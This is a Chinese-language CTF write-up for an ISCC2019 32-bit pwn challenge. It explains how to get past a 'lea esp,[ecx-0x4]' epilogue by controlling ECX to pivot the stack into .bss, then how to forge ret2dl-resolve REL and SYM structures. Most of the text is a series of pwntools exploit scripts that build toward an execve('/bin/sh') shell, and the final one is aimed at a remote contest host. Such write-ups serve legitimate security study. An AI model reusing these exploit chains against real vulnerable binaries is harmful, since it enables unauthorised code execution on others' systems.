> 原文链接: https://www.anquanke.com//post/id/187875 


# 在PWN题中绕过lea esp以及关于Ret2dl的一些补充


                                阅读量   
                                **605451**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0106da56003373a8a8.jpg)](https://p2.ssl.qhimg.com/t0106da56003373a8a8.jpg)

> 概述：ISCC2019的一道pwn题，对选手32位下的ret2dl的考察，之前投稿过一篇ret2dl的文章，但是具体调试阶段和原理讲解的都不是很周到。本文会根据做题的调试过程进行解析，介绍其中如何利用lea esp控制栈帧，以及如何调试一个伪造的重定向结构。

目录:<br>
0x00 程序分析<br>
0x01 stack povit<br>
0x02 对Rel2dl的一些补充<br>
0x03 纠错



## 0x00程序分析

拿到程序，按照惯例放入IDA，发现一个超级明显的栈溢出，而且还能输入超长的字符串。但是程序又不存在可以用ROP来调用的危险函数。<br>
这就是明显给我们构造ret2dl提供方便嘛，否则必须要写一段调用一下read，很麻烦。但是这道题刚开始的关键还不在retdl这个技术上。

[![](https://s2.ax1x.com/2019/09/30/uYXXiF.png)](https://s2.ax1x.com/2019/09/30/uYXXiF.png)

观察一下反汇编，发现ret的上一条命令是lea esp,[ecx-0x4]，而不是leave。

```
0x080484b1 &lt;main+91&gt;:    pop    ecx
  0x080484b2 &lt;main+92&gt;:    pop    ebx
  0x080484b3 &lt;main+93&gt;:    pop    ebp
  0x80484b4 &lt;main+94&gt;:    lea    esp,[ecx-0x4]
=&gt; 0x80484b7 &lt;main+97&gt;:    ret
```

根据之前的经验，这个程序应该是在64位下编译的32位程序，大佬说这是i386的平栈方式。main函数的ret，一旦覆盖大量的数据，就会导致栈顶地址出错。所以之前我一直认为是无法溢出成功的。因为一旦溢出大量数据，也会修改ECX的值，导致ESP的值出问题。

如下图所示。

`#PS:lea esp,[ecx-0x4] 实际上就是将ecx-0x4的值赋给ESP`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/09/30/uYX08H.png)

ESP=ECX(0x41414141-0x4)=0x4141413d

实际上在x64下编译的x86程序在ret前都会产生这一段代码。在我们使用栈溢出利用的时候，会导致栈帧出错。刚开始的初学者很容易一筹莫展（比如以前的我），因为无法完成一次EIP覆写。但是实际上，反复调试了几遍之后，就发现这道题并非不可利用。

其实既然ECX对ret时的ESP能产生直接影响，那么通过控制ECX也能间接控制ESP

只需要找到pop ecx 时候对应的栈顶，就能控制ECX。进而控制整个栈帧。

下面给出脚本。



## 0x01 stack povit

stack povit目的是伪造ecx控制esp的流程，而本题的lea ecx正好提供了绝妙的方案。

```
from pwn import *
p=process('./pwn01')
gdb.attach(p,'b *0x80484b1')
payload="A"*0xe
payload+=p32(0xffffd060) #控制ecx
p.sendline(payload)
p.interactive()
```

以上代码成功控制了ecx，使得栈顶没有乱跑。

但是因为栈空间的随机化，导致对esp的控制没有了意义。因为每次ret时候，栈顶的位置都不确定

所以必须要到一个地址可控的区域，第一个想到的就是bss段。

通过find，发现buf的参数也是存放在bss段中。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/09/30/uYXwPe.png)

直接伪造ecx，让栈指向到bss段中

```
from pwn import *
p=process('./pwn01')
gdb.attach(p,'b *0x80484b1')

Address=0x12345678
fake_ecx=0x804a05a

payload="A"*0xe
payload+=p32(fake_ecx)
payload+="BBBB"
payload+=p32(Address)

p.sendline(payload)
p.interactive()
```

成功控制esp指向bss段

[![](https://s2.ax1x.com/2019/09/30/uYX7q0.png)](https://s2.ax1x.com/2019/09/30/uYX7q0.png)

改变了ESP，现在通过gadget让EBP也进入bss段。

```
from pwn import *

p=process('./pwn01')
gdb.attach(p,'b *0x80484b1')

Address=0x12345678
fake_ecx=0x804a05a

fake_esp=fake_ecx-0x4
base_stage=fake_esp+0x800

gadget1=0x0804851b #pop ebp |ret

#New stack
payload="A"*0xe
payload+=p32(fake_ecx)
payload+="BBBB"
payload+=p32(gadget1)
payload+=p32(base_stage)

p.sendline(payload)

#fake_struct

p.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/09/30/uYXa5D.png)

到此，我们已经完成了对栈的完全控制，将栈转移到了bss这个地址固定的段。



## 0x02对Rel2dl的一些补充

### <a class="reference-link" name="FAKE_REL%E9%83%A8%E5%88%86"></a>FAKE_REL部分

解决问题:实际调试时候，如何判断自己伪造的结构被程序读取。

从plt表中跳入dl_reslove函数时候dl_resolve会根据你的reloc_argc找到你的JMPREL结构(我们伪造的)

伪造的r_info 可以先写0x107 ,看看能不能解析真正的read函数。如果不行说明伪造的结构有问题。

[![](https://s2.ax1x.com/2019/09/30/uYXB2d.png)](https://s2.ax1x.com/2019/09/30/uYXB2d.png)

源代码如下

```
0xf7fee000:    push   eax
   0xf7fee001:    push   ecx
   0xf7fee002:    push   edx
   0xf7fee003:    mov    edx,DWORD PTR [esp+0x10]
   0xf7fee007:    mov    eax,DWORD PTR [esp+0xc]
=&gt; 0xf7fee00b:    call   0xf7fe77e0
```

函数通过加粗代码，将linkmap和reloc_arg分别存入edx和eax，然后call dl_fixup。

所以只需要判断call的时候edx和eax的值是不是我们传入的值就能判断，结构伪造是否成功。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/09/30/uYXDxA.png)

实际调试

Py脚本(不完整版本，仅部分实现)

```
# -*- coding: utf-8 -*-
from pwn import *

p=process('./pwn01')
gdb.attach(p,'b *0x80484b1')

Address=0x12345678
fake_ecx=0x804a05a

buf=0x804a040
fake_esp=fake_ecx-0x4
base_stage=fake_esp+0x800
read_plt=0xf7ed2b00

gadget1=0x0804851b #pop ebp |ret
gadget2=0x08048519 #  pop esi ; pop edi ; pop ebp ; ret

#New stack
payload="A"*0xe
payload+=p32(fake_ecx)
payload+="BBBB"
payload+=p32(gadget1)
payload+=p32(base_stage)
#p.sendline(payload)

#fake_struct
plt0=0x80482f0
rel_plt=0x080482b4
reloc_arg=buf+0x200-rel_plt #fake_rel放后面一些，防止被出栈入栈覆盖
dynsym=0x080481cc
dynstr=0x0804822c
r_offset=0x0804a00c #read_got
r_info=0x107

fake_rel=p32(r_offset)+p32(r_info)
payload+=p32(plt0)
payload+=p32(reloc_arg)
payload+="A"*(0x200-len(payload)) #fake_rel的位置
payload+=fake_rel #buf+0x200

p.sendline(payload)
p.interactive()
```

传送reloc没问题

```
EAX=0xf7ffd918 #link_map
EDX=0x1db2 #reloc_argc
```

[![](https://s2.ax1x.com/2019/09/30/uYXsKI.png)](https://s2.ax1x.com/2019/09/30/uYXsKI.png)

然后就进入call 0xf7fe77e0了，应该会读取我们伪造的REL结构了。但是执行到push esi的时候。

一开始以为是我们结构构造错误，但是自己观察报错。

发现提示SIGSEGV，即段错误。

再仔细一看，现在的栈已经下降到了0x804a002了，已经从bss段下降到了其他不可写的段，直接导致了段错误。

主要原因是因为我图方便，把bss的首地址作为了栈顶。解决方案就是在程序开始的时候就大幅度提高栈的地址。#这个图方便导致我卡了一个半个小时

[![](https://s2.ax1x.com/2019/09/30/uYX6qP.png)](https://s2.ax1x.com/2019/09/30/uYX6qP.png)

[![](https://s2.ax1x.com/2019/09/30/uYXyrt.png)](https://s2.ax1x.com/2019/09/30/uYXyrt.png)

于是提高栈空间重新写一下exp

```
# -*- coding: utf-8 -*-
from pwn import *

p=process('./pwn01')
gdb.attach(p,'b *0x80484b1')

Address=0x12345678
fake_ecx=0x804a05a

buf=0x804a040
fake_esp=fake_ecx-0x4
base_stage=fake_esp+0x800
read_plt=0xf7ed2b00
stack_size=0x500

gadget1=0x0804851b #pop ebp |ret
gadget2=0x08048519 #  pop esi ; pop edi ; pop ebp ; ret
gadget3=0x080483c5 #
#New stack
payload="A"*0xe
payload+=p32(fake_ecx)
payload+="BBBB"
#payload+=p32(read_plt)
#payload+=p32(gadget2)
#payload+=p32(0)+p32(base_stage)+p32(100)
payload+=p32(gadget1)
payload+=p32(base_stage)
payload+=p32(gadget3)
payload+=p32(base_stage+stack_size)
#p.sendline(payload)

#struct

plt0=0x80482f0
rel_plt=0x080482b4
reloc_arg=0x804a862-rel_plt #放后面一些，否则会被覆盖
dynsym=0x080481cc
dynstr=0x0804822c
r_offset=0x0804a00c #read_got
r_info=0x107

fake_rel=p32(r_offset)+p32(r_info)
payload+="A"*(0x804a85a-buf-len(payload))
payload+=p32(plt0)
payload+=p32(reloc_arg)
payload+=fake_rel

p.sendline(payload)
p.interactive()
```

可以看到call结束之后，直接进入了read函数。

因为我们赋给r_info =0x107，正好读取了read的SYM结构

[![](https://s2.ax1x.com/2019/09/30/uYXgVf.png)](https://s2.ax1x.com/2019/09/30/uYXgVf.png)

### <a class="reference-link" name="FAKE_SYM%E9%83%A8%E5%88%86"></a>FAKE_SYM部分

经验：在写ret2dl方法的时候，一般不是一气呵成的。先尝试把数据布置在bss段中，然后调试程序，确定代码的位置，然后再修改reloc_arg、fake_rel和fake_sym结构里面的参数到正确的位置。否则，一下子是很难拿写出来的。

```
Q1：程序退出，0177这种报错，说明是查找dysn，却没有找到对应的内容。需要重新检查构造的SYM结构。
```

[![](https://s2.ax1x.com/2019/09/30/uYX2a8.png)](https://s2.ax1x.com/2019/09/30/uYX2a8.png)

```
Q2：SIGSEGV报错，还是一样的栈过低问题。也可能是r_info读取位置错了，读到其他段里面去了。
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/09/30/uYXRIS.png)

```
Q3：symbol lookup error ，读取sym结构错误，（ECX中显示）应该是读取的位置不正确。
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/09/30/uYXhGQ.png)

根据前文，我们可以写出一个满是补丁的EXP，并且包含大量硬编码。

```
# -*- coding: utf-8 -*-
from pwn import *

p=process('./pwn01')
gdb.attach(p,'b *0x80484b1')

Address=0x12345678
fake_ecx=0x804a05a

buf=0x804a040
fake_esp=fake_ecx-0x4
base_stage=fake_esp+0x800
read_plt=0xf7ed2b00
stack_size=0x500

gadget1=0x0804851b #pop ebp |ret
gadget2=0x08048519 #  pop esi ; pop edi ; pop ebp ; ret
gadget3=0x080483c5 # leave ；ret
#New stack
payload="A"*0xe
payload+=p32(fake_ecx)
payload+="BBBB"
#payload+=p32(read_plt)
#payload+=p32(gadget2)
#payload+=p32(0)+p32(base_stage)+p32(100)
payload+=p32(gadget1)
payload+=p32(base_stage)
payload+=p32(gadget3)
payload+=p32(base_stage+stack_size)
#p.sendline(payload)

#struct
dynsym=0x080481cc
dynstr=0x0804822c
plt0=0x80482f0
rel_plt=0x080482b4

reloc_arg=0x804a862-rel_plt #fang hou mian yidian ,hui bei fugai
r_offset=0x0804a00c #read_got

fake_sym_addr=0x804a86a
align=0x10-((fake_sym_addr-dynsym)&amp;0xf) #align=8#栈对齐
fake_sym_addr=fake_sym_addr+align
r_info=((fake_sym_addr-dynsym)/0x10)&lt;&lt;8|0x7
#r_info=0x107

fake_rel=p32(r_offset)+p32(r_info)

payload+="A"*(0x804a85a-buf-len(payload))
payload+=p32(plt0)
payload+=p32(reloc_arg)
payload+=fake_rel

st_name=0x804a87c-dynstr
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

payload+="B"*align
payload+=fake_sym
payload+="systemx00"


p.sendline(payload)
p.interactive()
```

成功重定位read为system函数

但是参数布置依旧很麻烦

解决方案就是在payload+=p32(reloc_arg)后面添加4个字节任意数和/bin/sh的地址。

这样弹出shell之后，程序的参数正好指向/bin/sh

[![](https://s2.ax1x.com/2019/09/30/uYX5xs.png)](https://s2.ax1x.com/2019/09/30/uYX5xs.png)

代码如下：

```
# -*- coding: utf-8 -*-
from pwn import *

p=process('./pwn01')
#p=remote('39.100.87.24',8101)
gdb.attach(p,'b *0x80484b1')

Address=0x12345678
fake_ecx=0x804a05a

buf=0x804a040
fake_esp=fake_ecx-0x4
base_stage=fake_esp+0x800
read_plt=0xf7ed2b00
stack_size=0x500

gadget1=0x0804851b #pop ebp |ret
gadget2=0x08048519 #  pop esi ; pop edi ; pop ebp ; ret
gadget3=0x080483c5 #
#New stack
payload="A"*0xe
payload+=p32(fake_ecx)
payload+="BBBB"
#payload+=p32(read_plt)
#payload+=p32(gadget2)
#payload+=p32(0)+p32(base_stage)+p32(100)
payload+=p32(gadget1)
payload+=p32(base_stage)
payload+=p32(gadget3)
payload+=p32(base_stage+stack_size)
#p.sendline(payload)

#struct
dynsym=0x080481cc
dynstr=0x0804822c
plt0=0x80482f0
rel_plt=0x080482b4

reloc_arg=0x804a872-rel_plt #fang hou mian yidian ,hui bei fugai
r_offset=0x0804a00c #read_got

fake_sym_addr=0x804a87a
align=0x10-((fake_sym_addr-dynsym)&amp;0xf) #align=8#栈对齐
fake_sym_addr=fake_sym_addr+align
r_info=((fake_sym_addr-dynsym)/0x10)&lt;&lt;8|0x7
#r_info=0x107

fake_rel=p32(r_offset)+p32(r_info)
bin_sh=0x804a8e3
payload+="A"*(0x804a85a-buf-len(payload))
payload+=p32(plt0)
payload+=p32(reloc_arg)
payload+="A"*4
payload+=p32(bin_sh)#set argc
payload+="A"*8
payload+=fake_rel

st_name=0x804a88c-dynstr
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

payload+="B"*align
payload+=fake_sym
payload+="systemx00"
payload+="A"*80
payload+="/bin/shx00"

p.sendline(payload)
p.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/09/30/uYX42j.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/09/30/uYXoMn.png)

但是依旧没弹出shell，参数和system都没有错。

后来忽然脑海里想象出了大师傅的一句话，用execve，别用system。

于是，换成execve就解决了[execve要设置三个参数/bin/sh ，0 ，0]

最终脚本：

```
# -*- coding: utf-8 -*-
from pwn import *

#p=process('./pwn01')
p=remote("39.100.87.24",8101)
#gdb.attach(p,'b *0x80484b1')

Address=0x12345678
fake_ecx=0x804a05a

buf=0x804a040
fake_esp=fake_ecx-0x4
base_stage=fake_esp+0x800
read_plt=0xf7ed2b00
stack_size=0x500

gadget1=0x0804851b #pop ebp |ret
gadget2=0x08048519 #  pop esi ; pop edi ; pop ebp ; ret
gadget3=0x080483c5 #
#New stack
payload="A"*0xe
payload+=p32(fake_ecx)
payload+="BBBB"
#payload+=p32(read_plt)
#payload+=p32(gadget2)
#payload+=p32(0)+p32(base_stage)+p32(100)
payload+=p32(gadget1)
payload+=p32(base_stage)
payload+=p32(gadget3)
payload+=p32(base_stage+stack_size)
#p.sendline(payload)

#struct
dynsym=0x080481cc
dynstr=0x0804822c
plt0=0x80482f0
rel_plt=0x080482b4

reloc_arg=0x804a872-rel_plt #fang hou mian yidian ,hui bei fugai
r_offset=0x0804a00c #read_got

fake_sym_addr=0x804a87a
align=0x10-((fake_sym_addr-dynsym)&amp;0xf) #align=8#栈对齐
fake_sym_addr=fake_sym_addr+align
r_info=((fake_sym_addr-dynsym)/0x10)&lt;&lt;8|0x7
#r_info=0x107

fake_rel=p32(r_offset)+p32(r_info)
bin_sh=0x804a8e3
payload+="A"*(0x804a85a-buf-len(payload))
payload+=p32(plt0)
payload+=p32(reloc_arg)
payload+="A"*4
payload+=p32(bin_sh)#set argc #之前的wp里面写错了
payload+=p32(0)+p32(0)
payload+=fake_rel

st_name=0x804a88c-dynstr
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

payload+="B"*align
payload+=fake_sym
payload+="execvex00"
payload+="A"*80
payload+="/bin/shx00"
payload+="A"*20

p.sendline(payload)
p.interactive()
```

但是远程服务器还是不行，据说是服务器控制只能一次输入200字节，导致我们这个超长的payload没有用武之地。如果要服务器上实现，只需要将payload分开，每次再payload结尾调用read再次读取数据到栈中。



## 0x03 纠错:

之前投稿到安全客的文章，写时候没多想，第四行的注释写错了。

Base_stage+80实际上是/bin/sh的位置，做传参之用。

[![](https://s2.ax1x.com/2019/09/30/uYXqaT.png)](https://s2.ax1x.com/2019/09/30/uYXqaT.png)

Ret2dl的原理在上一篇文章里做了浅显的解析。

文章投稿到了安全客，可以[点击此处](https://www.anquanke.com/post/id/177450)查看。



## 资源下载

这次的pwn题案例放在github上了

个人整理的pwn题 [下载地址](https://github.com/migraine-sudo/PWN-)

更多的pwn题分析可以访问我的个人博客 [https://migraine-sudo.github.io/](https://migraine-sudo.github.io/)
